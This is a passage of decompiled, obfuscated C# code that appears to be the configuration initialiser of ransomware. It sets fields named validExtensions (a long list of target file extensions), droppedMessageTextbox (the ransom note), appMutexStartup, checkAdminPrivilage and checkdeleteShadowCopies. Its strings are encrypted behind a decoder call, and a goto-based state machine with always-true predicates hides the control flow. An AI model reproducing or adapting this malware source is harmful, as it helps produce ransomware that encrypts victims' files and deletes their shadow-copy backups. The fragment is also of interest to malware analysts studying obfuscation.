								string_0 = Class0.smethod_11(188);
								array = (string[])3;
								goto IL_052d;
							case 167:
								array2[222] = Class0.smethod_11(1152);
								goto case 30;
							case 30:
								array2[223] = Class0.smethod_11(712);
								array = (string[])121;
								goto case 121;
							case 121:
								array2[224] = Class0.smethod_11(1156);
								goto case 144;
							case 144:
								array2[225] = Class0.smethod_11(1160);
								goto case 128;
							case 128:
								array2[226] = Class0.smethod_11(1164);
								array2[227] = Class0.smethod_11(1168);
								array = (string[])62;
								goto case 62;
							case 62:
								array2[228] = Class0.smethod_11(1172);
								array = (string[])166;
								if (!smethod_1())
								{
									goto IL_035a;
								}
								goto case 166;
							case 146:
								array2[119] = Class0.smethod_11(740);
								goto case 33;
							case 33:
								array2[120] = Class0.smethod_11(744);
								array = (string[])204;
								goto case 204;
							case 204:
								array2[121] = Class0.smethod_11(748);
								array = (string[])36;
								goto case 36;
							case 36:
								array2[122] = Class0.smethod_11(752);
								array = (string[])57;
								goto case 57;
							case 57:
								array2[123] = Class0.smethod_11(756);
								array = (string[])13;
								goto case 13;
							case 13:
								array2[124] = Class0.smethod_11(760);
								array = (string[])125;
								goto case 125;
							case 125:
								array2[125] = Class0.smethod_11(764);
								array2[126] = Class0.smethod_11(768);
								array2[127] = Class0.smethod_11(772);
								array = (string[])199;
								goto case 199;
							case 199:
								array2[128] = Class0.smethod_11(776);
								array2[129] = Class0.smethod_11(780);
								goto case 261;
							case 261:
								array2[130] = Class0.smethod_11(784);
								array = (string[])186;
								goto case 186;
							case 186:
								array2[131] = Class0.smethod_11(788);
								array = (string[])189;
								goto IL_17e4;
							case 189:
								goto IL_17e4;
							case 98:
								goto IL_17f5;
							case 108:
								array2[77] = Class0.smethod_11(572);
								array = (string[])253;
								break;
							case 193:
								goto IL_1c72;
							case 263:
								goto IL_1c98;
							case 202:
								array2[19] = Class0.smethod_11(340);
								array = (string[])79;
								goto case 79;
							case 79:
								array2[20] = Class0.smethod_11(344);
								array = (string[])86;
								goto case 86;
							case 86:
								array2[21] = Class0.smethod_11(348);
								goto IL_1ced;
							case 245:
								goto IL_1ced;
							case 118:
								goto IL_1d06;
							case 10:
								goto end_IL_1d06;
							case 133:
								goto end_IL_1d21;
							case 48:
								goto end_IL_1d3b;
							case 166:
								validExtensions = array2;
								array = (string[])249;
								goto case 249;
							case 249:
								random = new Random();
								array = (string[])268;
								return;
							case 268:
								return;
							}
							break;
						}
						goto IL_000a;
						IL_1465:
						array2[27] = Class0.smethod_11(372);
						array = (string[])220;
						goto IL_0c82;
						IL_0c82:
						array2[28] = Class0.smethod_11(376);
						array = (string[])105;
						if (smethod_2())
						{
							goto IL_07d1;
						}
						goto IL_1830;
						IL_0499:
						array2[168] = Class0.smethod_11(936);
						goto IL_04aa;
						IL_04aa:
						array2[169] = Class0.smethod_11(940);
						array = (string[])39;
						goto IL_04c4;
						IL_04c4:
						array2[170] = Class0.smethod_11(944);
						goto IL_04d5;
						IL_04d5:
						array2[171] = Class0.smethod_11(948);
						array = (string[])90;
						goto IL_04ef;
						IL_04ef:
						array2[172] = Class0.smethod_11(952);
						array = (string[])151;
						goto IL_0509;
						IL_0509:
						array2[173] = Class0.smethod_11(956);
						array = (string[])140;
						if (smethod_2())
						{
							goto IL_052d;
						}
						goto IL_1830;
						IL_052d:
						appMutexStartup = Class0.smethod_11(192);
						array = (string[])170;
						goto IL_0545;
						IL_0545:
						droppedMessageTextbox = Class0.smethod_11(196);
						array = (string[])264;
						goto IL_055d;
						IL_055d:
						checkAdminPrivilage = false;
						goto IL_0563;
						IL_0563:
						checkdeleteShadowCopies = false;
						array = (string[])248;
						if (!smethod_1())
						{
							goto IL_0304;
						}
						goto IL_1830;
						IL_0258:
						array2[143] = Class0.smethod_11(836);
						array = (string[])185;
						goto IL_0272;
						IL_0272:
						array2[144] = Class0.smethod_11(840);
						goto IL_0283;
						IL_0283:
						array2[145] = Class0.smethod_11(844);
						array = (string[])237;
						goto IL_029d;
						IL_029d:
						array2[146] = Class0.smethod_11(848);
						goto IL_02ae;
						IL_02ae:
						array2[147] = Class0.smethod_11(852);
						goto IL_02bf;
						IL_02bf:
						array2[148] = Class0.smethod_11(856);
						array = (string[])34;
						goto IL_02d9;
						IL_02d9:
						array2[149] = Class0.smethod_11(860);
						array = (string[])51;
						goto IL_02f3;
						IL_02f3:
						array2[150] = Class0.smethod_11(864);
						goto IL_0304;
						IL_0304:
						array2[151] = Class0.smethod_11(868);
						array = (string[])252;
						goto IL_031e;
						IL_01c3:
						array2[137] = Class0.smethod_11(812);
						array = (string[])136;
						goto IL_01dd;
						IL_01dd:
						array2[138] = Class0.smethod_11(816);
						goto IL_01ee;
						IL_01ee:
						array2[139] = Class0.smethod_11(820);
						array = (string[])247;
						if (smethod_1())
						{
							goto IL_0212;
						}
						goto IL_06f5;
						IL_0212:
						array2[140] = Class0.smethod_11(824);
						goto IL_0223;
						IL_0223:
						array2[141] = Class0.smethod_11(828);
						goto IL_0234;
						IL_06f5:
						array[20] = "";
						array = (string[])70;
						goto IL_0707;
						IL_0707:
						array[21] = Class0.smethod_11(240);
						goto IL_0715;
						IL_0715:
						array[22] = "";
						goto IL_071e;
						IL_071e:
						array[23] = Class0.smethod_11(244);
						array[24] = "";
						array = (string[])8;
						goto IL_073e;
						IL_073e:
						array[25] = Class0.smethod_11(248);
						goto IL_074c;
						IL_074c:
						array[26] = "";
						array = (string[])231;
						goto IL_075e;
						IL_075e:
						array[27] = Class0.smethod_11(252);
						array = (string[])168;
						goto IL_0775;
						IL_0775:
						array[28] = "";
						goto IL_077e;
						IL_077e:
						array[29] = "";
						array = (string[])114;
						goto IL_0790;
						IL_0790:
						array[30] = "";
						array = (string[])187;
						if (smethod_2())
						{
							goto IL_07ac;
						}
						goto IL_1830;
						IL_07ac:
						array2[55] = Class0.smethod_11(484);
						array = (string[])129;
						goto IL_07c3;
						IL_07c3:
						array2[56] = Class0.smethod_11(488);
						goto IL_07d1;
						IL_07d1:
						array2[57] = Class0.smethod_11(492);
						array2[58] = Class0.smethod_11(496);
						array = (string[])94;
						goto IL_07f6;
						IL_07f6:
						array2[59] = Class0.smethod_11(500);
						array = (string[])191;
						if (smethod_2())
						{
							goto IL_0174;
						}
						goto IL_1830;
						IL_002b:
						array2[79] = Class0.smethod_11(580);
						array2[80] = Class0.smethod_11(584);
						array = (string[])87;
						goto IL_0050;
						IL_0050:
						array2[81] = Class0.smethod_11(588);
						goto IL_005e;
						IL_005e:
						array2[82] = Class0.smethod_11(592);
						goto IL_006c;
						IL_006c:
						array2[83] = Class0.smethod_11(596);
						array = (string[])219;
						goto IL_0083;
						IL_0083:
						array2[84] = Class0.smethod_11(600);
						goto IL_0091;
						IL_0091:
						array2[85] = Class0.smethod_11(604);
						goto IL_009f;
						IL_009f:
						array2[86] = Class0.smethod_11(608);
						array = (string[])259;
						goto IL_00b6;
						IL_00b6:
						array2[87] = Class0.smethod_11(612);
						array = (string[])115;
						goto IL_00cd;
						IL_00cd:
						array2[88] = Class0.smethod_11(616);
						goto IL_00db;
						IL_00db:
						array2[89] = Class0.smethod_11(620);
						array = (string[])64;
						goto IL_00f2;
						IL_00f2:
						array2[90] = Class0.smethod_11(624);
						array = (string[])120;
						goto IL_0109;
						IL_0109:
						array2[91] = Class0.smethod_11(628);
						array = (string[])157;
						goto IL_0120;
						IL_0120:
						array2[92] = Class0.smethod_11(632);
						array = (string[])103;
						goto IL_0137;
						IL_0137:
						array2[93] = Class0.smethod_11(636);
						array2[94] = Class0.smethod_11(640);
						goto IL_0153;
						IL_0153:
						array2[95] = Class0.smethod_11(644);
						array = (string[])235;
						if (!smethod_1())
						{
							goto IL_0174;
						}
						goto IL_1830;
						IL_031e:
						array2[152] = Class0.smethod_11(872);
						array2[153] = Class0.smethod_11(876);
						goto IL_0340;
						continue;
						end_IL_1d06:
						break;
					}
					continue;
					end_IL_1d21:
					break;
				}
				continue;
				end_IL_1d3b:
				break;
			}
		}
	}

	internal static bool smethod_1()
	{
		return true;
	}

	internal static bool smethod_2()
	{
		return true;
	}
}
